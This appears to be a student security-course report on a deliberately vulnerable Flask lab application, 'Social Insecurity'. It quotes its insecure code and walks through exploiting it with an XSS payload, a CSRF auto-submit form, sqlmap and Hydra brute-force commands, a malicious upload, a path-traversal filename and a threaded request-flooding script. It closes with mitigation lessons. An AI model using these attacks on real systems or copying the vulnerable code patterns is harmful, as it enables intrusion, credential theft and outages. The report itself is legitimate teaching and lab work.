---
title: Vulnerability Assessment and Exploitation of "Social Insecurity"
date: 2025-06-29
tags: []
---

# **Information and Software Security - Vulnerability Assessment and Exploitation**

## **1. Introduction**

This report presents a security analysis of the "Social Insecurity" web application, a Flask-based application intentionally designed with several vulnerabilities for educational purposes. The objective of this assignment is to perform a vulnerability assessment and exploitation, thereby understanding web application security concepts, penetration testing techniques, and how to mitigate common security issues.

## **2. Vulnerability Assessment**

### **2.1 Overview of Assessment Process**

**OWASP ZAP** is an open-source security tool used to find vulnerabilities in web applications. We utilized its automated scan feature to analyze the "Social Insecurity" application. The following screenshots show the results and alerts detected:
![img-description](/assets/img/DAT250-Assignment-1/image9.png)
![img-description](/assets/img/DAT250-Assignment-1/image2.png)

The scan identified a high-risk alert for **Persistent Cross-Site Scripting (XSS)**, also known as **Stored XSS**. This vulnerability occurs when malicious scripts are injected and stored on the server, then delivered to users whenever the affected data is requested.

Upon reviewing the source code, we identified a vulnerability in the section of the website where posts are uploaded to a stream.

```python
# social_insecurity/routes.py (lines 78-82)
insert_post = f"""
    INSERT INTO Posts (u_id, content, image, creation_time)
    VALUES ({user["id"]}, '{post_form.content.data}', '{post_form.image.data.filename}', CURRENT_TIMESTAMP);
"""
sqlite.query(insert_post)
```

This code inserts user-provided data directly into an SQL statement without escaping or sanitization, which allows malicious content to be stored in the database. To confirm this, we tested by uploading a post with the payload:

```html
<script>
  alert("XSS");
</script>
```

After refreshing the page, we observed that the script executed, demonstrating the vulnerability.

This method of directly inserting form data into the SQL statement opens the door for SQL injection attacks because it doesn't sanitize or escape the input. Using SQLmap, we exploited this vulnerability to retrieve sensitive data, such as users and their passwords.

Through manual analysis of random requests, we found no CSRF token or SameSite cookie attribute in the request headers. This left the possibility of a CSRF vulnerability. To verify this, we created a simple HTML file with a POST request to the website. The request was successfully processed, confirming the website's vulnerability to CSRF.

By inspecting the developer tools and reviewing cookies and local storage, we found no sign of authentication tracking. Logging in only redirects users to the `/stream/<user>`. By modifying the URL, it is possible to access other users' profiles and streams, allowing unauthorized changes to be made on their behalf.

When creating an account, there are no password requirements, and a password isn't even mandatory. This makes the authentication process highly insecure (if authentication were implemented), as passwords could be easily guessed.

The website lacks any form of rate-limiting, which significantly simplifies password guessing attacks. This also exposes the site to denial-of-service (DoS) attacks, where a client can flood the server with multiple requests, potentially overwhelming it and causing the website to slow down or become unavailable.

In the post section of the stream page, there is an option to upload files. There are no restrictions on the files uploaded.

There is no check on file type or size.

```python
# social_insecurity/routes.py (lines 75-82)
path = Path(app.instance_path) / app.config["UPLOADS_FOLDER_PATH"] / post_form.image.data.filename
post_form.image.data.save(path)

insert_post = f"""
    INSERT INTO Posts (u_id, content, image, creation_time)
    VALUES ({user["id"]}, '{post_form.content.data}', '{post_form.image.data.filename}', CURRENT_TIMESTAMP);
"""
sqlite.query(insert_post)
```

This code lacks file type restrictions, making it possible to upload any kind of file.

```python
# social_insecurity/config.py (line 23)
ALLOWED_EXTENSIONS = {}  # TODO: Might use this at some point, probably don't want people to upload any file type
```

The filename is directly appended to the path, this allows us to use directory traversal sequence on the file name to change the path of where the file will be uploaded.

```python
path = Path(app.instance_path) / app.config["UPLOADS_FOLDER_PATH"] / post_form.image.data.filename
```

Passwords are stored in plaintext in the database, as observed from the database file and the code. By exploiting an SQL injection vulnerability, using the tool SQLmap, we successfully retrieved tables containing user information, including passwords stored in plaintext. This exposes sensitive user data and makes it vulnerable to database breaches!

![img-description](/assets/img/DAT250-Assignment-1/image10.png)

```python
# social_insecurity/routes.py (lines 46-50)
insert_user = f"""
    INSERT INTO Users (username, first_name, last_name, password)
    VALUES ('{register_form.username.data}', '{register_form.first_name.data}', '{register_form.last_name.data}', '{register_form.password.data}');
"""
sqlite.query(insert_user)
```

### **2.2 Discovered Vulnerabilities**

Below is a summary of the vulnerabilities identified during the assessment, categorized by common vulnerability types.

| Type                                | Description                                                                                                                                                 | Impact                                                                 |
| ----------------------------------- | :---------------------------------------------------------------------------------------------------------------------------------------------------------- | :--------------------------------------------------------------------- |
| Cross Site Scripting (XSS) (Stored) | Unsanitized input allows injection of malicious scripts that are stored on the server and executed in the browsers of all users who load the affected page. | Data theft, account compromise, phishing attack                        |
| Cross-Site Request Forgery (CSRF)   | No anti-CSRF tokens or protection mechanisms in place, allowing attackers to trick users into submitting malicious requests without their knowledge.        | Unauthorized actions on behalf of users                                |
| SQL injection                       | Input fields are vulnerable to SQL queries, allowing attackers to retrieve sensitive information from the database.                                         | Access to sensitive data, including passwords and personal information |
| Insecure authentication             | No password requirements                                                                                                                                    | Easy compromise of accounts                                            |
| Sensitive Data Exposure             | Password stored as plaintext, not hashed                                                                                                                    | Gain Privileges or Assume Identity                                     |
| Broken Access Control               | Parameter tampering                                                                                                                                         | Unauthorized profile access and modification                           |
| Unrestricted File Upload            | No checks on filetype or size                                                                                                                               | Malicious script execution                                             |
| DoS (Denial of Service)             | No rate limit on server                                                                                                                                     | Temporary unavailability or server crash                               |
| Path traversal                      | Upload files outside designated upload folder                                                                                                               | Unauthorized File Access                                               |

## **3. Vulnerability Exploitation**

### **3.1. Cross Site Scripting (XSS)**

- **Description:** The web application allows users to share a post containing unescaped JavaScript. This vulnerability enables attackers to inject malicious scripts that execute in the context of other users' browsers.
- **Tool(s) Used:** OWASP ZAP
- **Exploitation Steps:**

1. **Open the Web Application:**
   - Navigate to the stream section of the "Social Insecurity" web application (/stream/\<username\>)
2. **Post Malicious Comment:**
   - In the post input field, enter the payload: `<script>alert("XSS");</script>`
   - Submit the post.
3. **Verify:**
   - Refresh the page to confirm that the script executes, showing an alert box with the message "XSS."

![img-description](/assets/img/DAT250-Assignment-1/image5.png)

### **3.2. Cross-Site Request Forgery (CSRF)**

- **Description:** The web application does not have any measures against CSRF attack such as using a CSRF token in requests.
- **Tools Used:** OWASP ZAP, Chrome Developer Tools, Text Editor
- **Exploitation Steps:**

1. **Identify the vulnerable endpoint:**

   - Navigate to the profile section (/profile/\<username\>)
   - Open Chrome Developer Tools, observe how profile updates are sent to route `/profile/<username>` using a POST request.

2. **Analyze the request structure**

   - We observed that the profile update form includes fields like 'education', 'employment', etc.

3. **Craft the CSRF payload**
   - Create an HTML file with the following content:

```html
<!DOCTYPE html>
<body>
    <form id="form" action="http://127.0.0.1:5000/profile/test" method="POST">
        <input type="hidden" name="education" value="CSRF">
    </form>
    <script>
        document.getElementById('form').submit();
    </script>
</body>
</html>
```

4. **Execute**

   - Open the HTML file in your browser
   - The form will be sent on page load and redirect to the profile section

5. **Verify**
   - Check the profile page of the user
   - Confirm that the field "education" has been changed to "CSRF"

### **3.3. SQL injection**

- **Description:** Retrieve sensitive data such as passwords by using sql injection
- **Tools Used:**
  - sqlmap
- **Exploitation Steps:**

1. **Open terminal**

   - Open an new terminal instance

2. **Use sqlmap to perform sql injection**
   - Enter the following command in your terminal and input "yes" for any prompts

```bash
sqlmap -u http://127.0.0.1:5000/stream/test -a
```

![img-description](/assets/img/DAT250-Assignment-1/image4.png)

### **3.4. Broken Access Control**

- **Description:** There is no tracking of user authentication status. This allows users to edit the URL to access and modify any user's profile information directly, without proper authorization or validation.
- **Tools Used:** Web browser
- **Exploitation Steps:**

1. **Navigate to profile of test user**  
   http://127.0.0.1:5000/profile/test
2. **Make changes to profile**

   - Press the edit button
   - Make changes to profile
   - Apply changes

3. **Verify changes**
   - Refresh page and make sure changes applied

### **3.5. Sensitive Data Exposure**

**Description**: The web application stores user passwords in plaintext. This vulnerability was demonstrated through the SQL injection attack described in section 3.3. SQL Injection, which allowed us to retrieve sensitive data including plaintext passwords.

### **3.6. Insecure Authentication**

**Description**: The web application has insecure authentication mechanisms due to the lack of password requirements. Users can create an account with an empty password or without any constraints on password complexity, length, or security, making it easier for attackers to compromise accounts through weak passwords.

**Tools Used:** Hydra, Burp Suite

**Exploitation Steps:**

1. **Open Burp suite browser proxy**

   - Navigate to Proxy tab
   - Press open browser button
   - Enter URL http://127.0.0.1:5000/ in search bar

2. **Attempt login with intercept on**
   - Enable intercept
   - Login to website with invalid credentials
   - Make note of the form data such as

![img-description](/assets/img/DAT250-Assignment-1/image7.png)

```
login-username=aleks&login-password=123&login-submit=Sign+In
```

3. **Review response**

   - Navigate to HTTP history tab
   - Verify a message confirming invalid login
   - Hydra will use the message in the html response to confirm invalid logins

   ![img-description](/assets/img/DAT250-Assignment-1/image1.png)

4. **Use hydra to bruteforce account with common passwords**
   - Enter the following command in an terminal

```bash
hydra -l test -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 5000 http-post-form "/:login-username=test&login-password=^PASS^&login-submit=Sign+In:Sorry\,\ wrong\ password\!" -V -I
```

![img-description](/assets/img/DAT250-Assignment-1/image6.png)

### **3.7 Unrestricted File Upload**

**Description**: The web application lacks proper checks and validations for file uploads, allowing users to upload files of any type or size. This could be exploited by an attacker to upload malicious files (e.g., scripts, executable files) that could compromise the server or perform unauthorized actions.

**Tools Used**: Web browser, Text Editor

**Exploitation steps:**

1. **Navigate to stream**

   - Navigate to the stream page (/stream/test)

2. **Craft malicious file**
   - Create an HTML file with the following content:

```html
<!DOCTYPE html>
<html>
  <body>
    <script>
      window.location.href = "http://127.0.0.1:5000/stream/test";
      alert(":)");
    </script>
  </body>
</html>
```

3. **Save file**

   - Save file as malicious.html

4. **Upload malicious file**

   - Upload malicious file by clicking "choose file" button and selecting file
   - Share the post by clicking "post" button

5. **Navigate to the uploads url and verify**
   - Navigate to /uploads/malicious.html
   - Confirm the alert message popup

![img-description](/assets/img/DAT250-Assignment-1/image8.jpg)

### **3.8 Denial of Service (DoS)**

**Description:** The web application is vulnerable to a Denial of Service (DoS) attack due to the absence of rate limiting on key endpoints. This allows an attacker to send a high volume of requests to specific endpoints, potentially leading to server performance degradation or unresponsiveness.

**Tools Used:** Python script

**Exploitation Steps:**

1. **Craft Attack Script:**

```python
import requests
import threading

url = "http://127.0.0.1:5000"

def send_request():
    while True:
        try:
            response = requests.get(url)
            print(f"Request sent, response code: {response.status_code}")
        except Exception as e:
            print(f"Error: {e}")

num_threads = 50
threads = []

for i in range(num_threads):
    thread = threading.Thread(target=send_request)
    thread.start()
    threads.append(thread)

for thread in threads:
    thread.join()
```

2. **Run the Attack Script:**
   - Execute the script in your terminal. This will start sending numerous requests to the specified endpoint.

### **3.9 Path Traversal**

**Description:** It is possible to upload files outside of the designated uploads folder by intercepting the outgoing upload request and altering the filename to include traversal sequences such as '../' to navigate up in the directory tree.

**Tools Used:** Burp suite

**Exploitation Steps:**

1. **Open Burp Suite:**

   - Launch Burp Suite and navigate to the "Proxy" tab.

2. **Open browser with proxy:**

   - Open the configured browser by pressing "Open Browser"

3. **Access the Target URL:**

   - Navigate to the URL: http://127.0.0.1:5000/stream/test

4. **Enable Intercept:**

   - Ensure that the intercept is turned on by clicking on "Intercept is off"

5. **Upload a File:**

   - Press the "Choose file" button and select a file.

6. **Intercept the Request:**

   - Once you attempt to upload the file, Burp Suite will capture the request.

7. **Modify the Filename:**

   - In the intercepted request, locate the part where the filename is specified
   - Alter the filename to include traversal sequences, such as: `filename=../../uploaded_file.txt`.

   ![img-description](/assets/img/DAT250-Assignment-1/image11.png)

8. **Forward the Request:**
   - Click on "Forward" in Burp Suite to send the modified request to the server.

## **4. Impact Analysis**

The vulnerabilities found in the "Social Insecurity" web application would have serious consequences if they existed in a real-world application.

**Cross-Site Scripting (XSS)** poses a significant risk as it allows attackers to inject malicious scripts that execute in the browsers of users, potentially leading to data theft, account compromise, and identity theft. Attackers could use this to steal session cookies, hijack user sessions, or perform unauthorized actions on behalf of users.

**SQL Injection** is another critical threat. If attackers exploit this vulnerability, they can access and manipulate sensitive data stored in the database, including user credentials and personal information.

Storing passwords in plaintext rather then using an hash,

**Cross-Site Request Forgery (CSRF)** allows attackers to trick users into unknowingly performing actions, such as changing account details, as show in the exploitation

**Insecure authentication** allows for passwords to be easily guessed or brute-forced due to weak or absent password requirements, attackers can easily gain unauthorized access to user accounts

By having **Unrestricted File Uploads**, attackers can upload malicious files, they may execute arbitrary code on the server, potentially gaining full control over the application and its data.

Furthermore, the lack of rate-limiting leaves the application vulnerable to **Denial of Service (DoS)** attacks. Attackers could flood the server with requests, causing it to slow down or crash entirely.

**Broken access control** allows unauthorized users to modify other users' data, which could lead to privacy violations, identity theft, and fraud. In a real-world scenario, this would have a big impact on both users and the organization.

## **5. Lessons Learned**

From assessing and exploiting the "Social Insecurity" web application, we learned some important lessons about how to build more secure web apps and avoid common security problems. These lessons include:

**Input Validation and Sanitization:** We realized how important it is to clean up and check user inputs to prevent attacks like Cross-Site Scripting (XSS) and SQL Injection. It's crucial to escape or filter inputs properly.

**CSRF Protection**: Using CSRF tokens is necessary to stop unauthorized actions on behalf of users. Without them, the app can be easily attacked, as we saw with CSRF vulnerabilities.

**Authentication and Password Security**: Weak passwords and poor authentication methods make it easy for attackers to break into accounts. Strong password policies and secure hashing methods are necessary to protect user accounts.

**Access Control:** We found that weak access control allows users to bypass authorization and view other people's profiles. It's important to put proper checks in place to ensure that only authorized users can access sensitive information.

**File Upload Restrictions:** Allowing users to upload any kind of file is risky. We learned that you should carefully check the type, size, and content of uploaded files to avoid attacks like path traversal or malicious file uploads.

**Rate Limiting:** Without limits on the number of requests, we were able to perform a Denial of Service (DoS) attack. Adding rate limiting can help prevent these attacks and keep the server stable.

**Overall Security Awareness:** We saw how several small vulnerabilities can be combined to exploit an application. Secure coding practices, regular vulnerability checks, and following security guidelines like OWASP are crucial to building strong, secure web applications.

In summary, we learned that creating secure web apps requires paying attention to both client-side and server-side security issues. This includes handling data safely, securing authentication, controlling access, and validating inputs correctly.

# Appendix

**Source Code:** The source code for the 'Social Insecurity' web application is available at: https://github.com/xnira01/social-insecurity
